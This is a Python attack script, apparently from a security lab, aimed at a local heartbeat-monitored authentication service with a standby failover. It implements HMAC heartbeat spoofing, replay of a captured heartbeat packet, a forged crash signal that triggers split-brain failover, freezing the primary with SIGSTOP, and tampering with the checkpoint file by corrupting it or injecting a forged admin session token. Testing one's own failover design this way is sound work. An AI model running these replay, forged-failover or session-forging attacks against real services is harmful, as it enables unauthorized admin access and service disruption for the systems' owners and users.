import os
import time
import socket
import random
import hmac
import json
import sys
import signal
import subprocess

# Hardcoded victim host and port
MONITOR_HOST = "127.0.0.1"
MONITOR_PORT = 9999
FAILOVER_PORT = 9998
CHECKPOINT_FILE = "checkpoint.json"


def log(msg: str) -> None:
    ts = time.strftime("%H:%M:%S")
    print(f"[adversary {ts}] {msg}", flush=True)

# Should not work because we have HMAC implemented


def heartbeat_spoofing(number_of_attacks: int = 5, interval: float = 1.0):
    def guess_secret() -> bytes:
        length = random.randint(16, 32)
        return random.randbytes(length)

    def guess_sequence() -> int:
        return random.randint(0, 1000000)

    def make_heartbeat(seq: int, secret: bytes) -> bytes:
        ts = str(int(time.time() * 1000))  # timestamp in milliseconds
        message = f"{seq}|{ts}".encode()
        mac = hmac.digest(secret, message, "sha256").hex()
        return message + b"|" + mac.encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    log(
        f"Starting heartbeat spoofing attack against victim: {MONITOR_HOST}:{MONITOR_PORT}")

    for i in range(number_of_attacks):
        seq = guess_sequence()
        secret = guess_secret()
        packet = make_heartbeat(seq, secret)
        sock.sendto(packet, (MONITOR_HOST, MONITOR_PORT))
        log(f"Sent spoofed heartbeat {i} to {MONITOR_HOST}:{MONITOR_PORT} seq={seq} guessed key (hex)={secret.hex()}")
        time.sleep(interval)

    sock.close()
    log("Heartbeat spoofing attack finished")

# Should work because we don't verify sequence number or time


def replay_attack(number_of_attacks: int = 35, interval: float = 2.0):
    CAPTURED_PACKET = "1|1792613128187|d10950e6bed650bf5cc55337e4f1d2b0bcf16c6e0377adc9d8233ca31f0309af"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    log(
        f"Starting replay attack against victim: {MONITOR_HOST}:{MONITOR_PORT}. With captured packet: {CAPTURED_PACKET}")

    for i in range(number_of_attacks):
        sock.sendto(CAPTURED_PACKET.encode(), (MONITOR_HOST, MONITOR_PORT))
        log(f"Sent replayed packet {i} to {MONITOR_HOST}:{MONITOR_PORT}")
        time.sleep(interval)

    sock.close()
    log("Replay attack finished")


# Attack scenario 1: Induced False Failover
# Sending a direct fake crash signal to the standby causing splitbrain
def induced_failover():
    log(f"Starting induced failover attack on UDP {FAILOVER_PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b"SERVICE_CRASHED"
    sock.sendto(packet, (MONITOR_HOST, FAILOVER_PORT))
    log(f"Sent fake crash signal to Standby! ")
    sock.close()


# Attack scenario 1 (variant): Dropped/Delayed Heartbeats
# Freeze the primary with SIGSTOP. The process stays alive and keeps holding
# TCP 8080, but its heartbeat thread is frozen, so no beats reach the monitor.
# This simulates dropped/delayed heartbeats while the primary is still alive,
# then lets us watch whether the monitor spins up a second primary (split-brain).
def drop_heartbeats(freeze_seconds: float = 25.0):
    log("Looking for the primary authentication_service.py process...")
    try:
        out = subprocess.check_output(
            ["pgrep", "-u", str(os.getuid()), "-f", "python.*authentication_service"]
        ).decode().split()
        pids = [int(p) for p in out]
    except subprocess.CalledProcessError:
        log("No authentication_service.py process found. Is the primary running?")
        return
    if not pids:
        log("No primary process found.")
        return
    pid = pids[0]
    log(f"Freezing primary (PID {pid}) with SIGSTOP. It stays alive and keeps "
        f"TCP 8080, but its heartbeats stop.")
    os.kill(pid, signal.SIGSTOP)
    log(f"Primary frozen. Waiting {freeze_seconds:.0f}s for the monitor to declare "
        f"a false crash and attempt failover while the primary is still alive...")
    time.sleep(freeze_seconds)
    log(f"Resuming primary (PID {pid}) with SIGCONT.")
    os.kill(pid, signal.SIGCONT)
    log("Primary resumed. Check the monitor and standby: did a second primary "
        "spin up (split-brain), or did the standby fail to bind TCP 8080?")


# Attack scenario 2: Tampered Checkpoint
# Run after the primary crashes and before the standby takes over,
# otherwise the primary overwrites checkpoint.json on its next beat
def tamper_checkpoint(mode: str) -> None:
    if mode == "corrupt":
        # Overwrite the checkpoint with invalid JSON
        with open(CHECKPOINT_FILE, "w") as f:
            f.write("{corrupted")
        log(f"Corrupted {CHECKPOINT_FILE}")
    else:
        # Inject a forged admin session into the checkpoint
        sessions = {}
        try:
            with open(CHECKPOINT_FILE, "r") as f:
                sessions = json.load(f)
        except Exception:
            log(f"Could not read {CHECKPOINT_FILE}, creating a new one")
        sessions["token-admin-0000"] = "admin"
        with open(CHECKPOINT_FILE, "w") as f:
            json.dump(sessions, f)
        log("Injected forged session token-admin-0000 for user admin")


USAGE = "Usage: python adversary.py [heartbeat|replay|failover|delay|tamper|corrupt]"

if __name__ == "__main__":
    if len(sys.argv) == 2:
        argument = sys.argv[1].lower()
        if argument == "heartbeat":
            heartbeat_spoofing()
        elif argument == "replay":
            replay_attack()
        elif argument in ("failover", "induced_failover"):
            induced_failover()
        elif argument == "delay":
            drop_heartbeats()
        elif argument == "tamper":
            tamper_checkpoint("inject")
        elif argument == "corrupt":
            tamper_checkpoint("corrupt")
        else:
            log(USAGE)
    else:
        log(USAGE)
